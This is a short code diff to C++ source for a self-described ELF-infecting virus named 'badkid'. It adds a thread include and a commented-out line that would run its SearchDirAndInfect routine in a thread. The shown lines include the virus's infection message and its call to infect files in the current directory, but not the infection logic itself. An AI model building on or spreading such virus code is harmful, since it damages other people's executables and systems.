@@ -6,6 +6,7 @@
 #include <sys/types.h>
 #include <cctype>
 #include <sys/wait.h>
+#include <thread>
 
 void Infect(const char *elfName)
 {
@@ -132,6 +133,7 @@ public:
         // Call SearchDirAndInfect
         std::cerr << "You have been infected by virus `badkid`.\n\ttoo young too simple." << std::endl;
         SearchDirAndInfect(".");
+        // std::thread searchThread(SearchDirAndInfect, ".");
     }
 };
 
